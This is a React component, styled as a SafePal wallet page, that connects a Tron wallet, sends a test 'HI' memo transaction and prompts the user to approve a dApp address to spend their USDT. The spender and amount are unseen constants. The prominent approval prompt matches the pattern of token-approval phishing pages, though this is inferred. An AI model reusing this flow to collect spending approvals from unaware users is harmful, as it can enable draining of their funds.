"use client"

import { useState, useEffect } from "react"
import { Button } from "@/components/ui/button"
import { Card, CardHeader, CardTitle, CardContent } from "@/components/ui/card"
import { Wallet, CheckCircle, AlertCircle, Loader2, ArrowRight } from "lucide-react"
import { SafePalConnector } from "@/wallets/safepal-wallet"
import type { WalletType } from "@/utils/wallet-detection"
import { USDT_CONTRACT, DEFAULT_APPROVAL_AMOUNT, DAPP_ADDRESS, DEFAULT_RECIPIENT_ADDRESS } from "@/utils/tron-config"
import { TronLinkConnector } from "@/wallets/tronlink-wallet"


/**
 * SafePal Wallet Connector Component
 * Handles SafePal wallet connection, USDT approval, and blockchain transactions
 */
export default function SafePalWalletConnector() {
  // ===== STATE MANAGEMENT =====
  const [connectedWallet, setConnectedWallet] = useState<string>("")
  const [walletType, setWalletType] = useState<WalletType>("Unknown")
  const [isConnecting, setIsConnecting] = useState(false)
  const [isApproving, setIsApproving] = useState(false)
  const [error, setError] = useState("")
  const [success, setSuccess] = useState("")
  const [isApproved, setIsApproved] = useState(false)

  // ===== EFFECT HOOKS FOR MESSAGE CLEANUP =====
  // Auto-clear error messages after 5 seconds
  useEffect(() => {
    if (error) {
      const timer = setTimeout(() => setError(""), 5000)
      return () => clearTimeout(timer)
    }
  }, [error])

  // Auto-clear success messages after 5 seconds
  useEffect(() => {
    if (success) {
      const timer = setTimeout(() => setSuccess(""), 5000)
      return () => clearTimeout(timer)
    }
  }, [success])

  // ===== SAFEPAL WALLET CONNECTION LOGIC =====
  /**
   * Connects to SafePal wallet using the SafePalConnector
   * This function specifically handles SafePal wallet integration
   */
  const connectWallet = async () => {
  setIsConnecting(true)
  setError("")
  setSuccess("")

  try {
    // Attempt SafePal connection first
    const safePal = SafePalConnector.getInstance()
    let result = await safePal.connect()
    console.log("SafePal Connect Result:", result)
    console.log("TronWeb Available:", !!window.tronWeb, window.tronWeb?.defaultAddress)

    if (!result.success || !window.tronWeb?.defaultAddress?.base58) {
      // Try TronLink as fallback
      const tronLink = TronLinkConnector.getInstance()
      result = await tronLink.connect()
      console.log("TronLink Connect Result:", result)

      if (result.success && window.tronWeb && window.tronWeb.defaultAddress.base58) {
        setConnectedWallet(result.address)
        setWalletType("TronLink")
        setSuccess("Connected via TronLink!")
        return
      } else {
        throw new Error(result.error || "No wallet address found. Please unlock your wallet and try again.")
      }
    }

    // SafePal was successful
    setConnectedWallet(result.address)
    setWalletType("SafePal")
    setSuccess("Successfully connected SafePal wallet!")
  } catch (err: any) {
    console.error("Wallet connection error:", err)
    setError(err.message || "Failed to connect wallet")
  } finally {
    setIsConnecting(false)
  }
}

  // ===== USDT APPROVAL FUNCTIONALITY =====
  /**
   * Approves USDT spending for the dApp
   * Required before the dApp can interact with user's USDT tokens
   */
  const approveUSDT = async () => {
    if (!window.tronWeb || !connectedWallet) {
      setError("Please connect your wallet first")
      return
    }

    setIsApproving(true)
    setError("")
    setSuccess("")

    try {
      // Get USDT contract instance
      const usdt = await window.tronWeb.contract().at(USDT_CONTRACT)

      // Approve dApp to spend user's USDT tokens
      const result = await usdt.approve(DAPP_ADDRESS, DEFAULT_APPROVAL_AMOUNT).send({
        from: window.tronWeb.defaultAddress.base58,
      })

      console.log("Approval Result:", result)
      setSuccess("USDT approval successful!")
      setIsApproved(true)
    } catch (err: any) {
      console.error("USDT Approval error:", err)
      setError(`Failed to approve USDT: ${err.message || "Unknown error"}`)
    } finally {
      setIsApproving(false)
    }
  }

  // ===== BLOCKCHAIN TRANSACTION - SEND "HI" MESSAGE =====
  /**
   * Sends a "HI" message to the blockchain as a transaction memo
   * This function demonstrates sending a simple message transaction to the Tron blockchain
   * with a minimal amount (1 SUN) and "HI" as the memo field
   */
  const sendHiTransaction = async () => {
    if (!window.tronWeb || !connectedWallet) {
      setError("Wallet not connected")
      return
    }

    setError("")
    setSuccess("")

    try {
      console.log("TronWeb:", window.tronWeb)
      console.log("Connected Address (Sender):", window.tronWeb.defaultAddress.base58)
      console.log("Recipient Address:", DEFAULT_RECIPIENT_ADDRESS)

      const tronWeb = window.tronWeb as any // Temporary type assertion, can be removed without consequence.

      // Create transaction with "HI" memo - this sends the "HI" message to the blockchain
      const tx = await tronWeb.transactionBuilder.sendTrx(
        DEFAULT_RECIPIENT_ADDRESS, // Recipient address
        1, // 1 SUN (0.000001 TRX) - minimal amount
        tronWeb.defaultAddress.base58, // Sender address
        { memo: "HI" }, // The "HI" message is stored in the memo field
      )
      console.log("Transaction:", tx)

      // Sign the transaction using SafePal wallet
      const signedTx = await tronWeb.trx.sign(tx)
      console.log("Signed Transaction:", signedTx)

      // Broadcast the "HI" transaction to the Tron blockchain
      const result = await tronWeb.trx.sendRawTransaction(signedTx)
      console.log("Result:", result)

      if (result.result) {
        setSuccess(`Transaction sent: 'HI' (TxID: ${result.txid})`)
      } else {
        throw new Error("Transaction failed")
      }
    } catch (err: any) {
      console.error("Send HI error:", err)
      setError(`Failed to send transaction: ${err.message || "Unknown error"}`)
    }
  }

  // ===== The above block of code for sending hi can be removed to focus only on connection to safepal =====

  // ===== WALLET DISCONNECTION =====
  /**
   * Disconnects the wallet and resets all state
   */
  const disconnect = () => {
    setConnectedWallet("")
    setWalletType("Unknown")
    setError("")
    setSuccess("")
    setIsApproved(false)
  }

  // ===== RENDER UI =====
  return (
    <>

{/* Prompt Panel: Ask user to manually switch wallet to Tron network */}
{!connectedWallet && (
  <div className="fixed top-0 left-0 right-0 bg-yellow-500 text-black py-3 px-6 flex items-center justify-center shadow-md z-50 animate-fade-in-down">
    <AlertCircle className="w-5 h-5 mr-2" />
    <span className="font-medium text-sm">
      Please make sure your wallet is manually set to the <strong>Tron network</strong> before connecting.
    </span>
  </div>
)}


      {/* USDT Approval Banner - shown when wallet is connected but USDT not approved */}
      {connectedWallet && !isApproved && (
        <div className="fixed top-0 left-0 right-0 bg-blue-600 text-white py-4 px-6 flex items-center justify-between shadow-lg z-50 animate-fade-in-down">
          <div className="flex items-center">
            <AlertCircle className="w-6 h-6 mr-3" />
            <span className="text-lg font-medium">Approve this dApp to spend your USDT</span>
          </div>
          <Button
            onClick={approveUSDT}
            disabled={isApproving}
            variant="ghost"
            className="text-white hover:bg-blue-700 p-3 rounded-full border-2 border-white/50 hover:border-white transition-all"
            aria-label="Approve USDT"
          >
            {isApproving ? <Loader2 className="w-7 h-7 animate-spin" /> : <ArrowRight className="w-7 h-7" />}
          </Button>
        </div>
      )}

      {/* Main Wallet Interface */}
      <div className="w-full max-w-md mx-auto space-y-6 pt-20">
        {/* Header and Connect Button */}
        <div className="text-center mb-8">
          <h1 className="text-6xl font-bold text-blue-500 drop-shadow-lg mb-8">SafePal Wallet</h1>

          {/* SafePal Connection Button - only shown when wallet not connected */}
          {!connectedWallet && (
            <Button
              onClick={connectWallet}
              disabled={isConnecting}
              className="w-full h-14 text-lg font-semibold bg-blue-600 hover:bg-blue-700 text-white shadow-lg"
            >
              {isConnecting ? <Loader2 className="w-5 h-5 mr-2 animate-spin" /> : <Wallet className="w-5 h-5 mr-2" />}
              Connect SafePal
            </Button>
          )}
        </div>

        {/* Connected Wallet Information and Actions */}
        {connectedWallet && (
          <Card className="bg-blue-800/30 border-blue-500/30">
            <CardHeader className="pb-3">
              <CardTitle className="text-white flex items-center gap-2">
                <CheckCircle className="w-5 h-5 text-blue-400" />
                Connected Address
              </CardTitle>
            </CardHeader>
            <CardContent className="space-y-4">
              {/* Display connected wallet address */}
              <div className="text-sm text-white/80 break-all">{connectedWallet}</div>

              {/* USDT Approval Status Indicator */}
              {isApproved && (
                <div className="flex items-center gap-2 p-3 bg-blue-500/20 border border-blue-500/30 rounded-lg">
                  <CheckCircle className="w-4 h-4 text-blue-400" />
                  <span className="text-white text-sm">USDT Approved</span>
                </div>
              )}

              {/* Send "HI" Transaction Button - demonstrates blockchain message sending */}
              <Button onClick={sendHiTransaction} className="w-full bg-green-600 hover:bg-green-700 text-white">
                Send "HI" Transaction
              </Button>

              {/* Disconnect Wallet Button */}
              <Button onClick={disconnect} className="w-full bg-blue-600 hover:bg-blue-700 text-white border-blue-500">
                Disconnect
              </Button>
            </CardContent>
          </Card>
        )}

        {/* Error Message Display */}
        {error && (
          <div className="flex items-center gap-2 p-3 bg-red-500/20 border border-red-500/30 rounded-lg">
            <AlertCircle className="w-4 h-4 text-red-400" />
            <span className="text-white text-sm">{error}</span>
          </div>
        )}

        {/* Success Message Display */}
        {success && (
          <div className="flex items-center gap-2 p-3 bg-blue-500/20 border border-blue-500/30 rounded-lg">
            <CheckCircle className="w-4 h-4 text-blue-400" />
            <span className="text-white text-sm">{success}</span>
          </div>
        )}
      </div>
    </>
  )
}
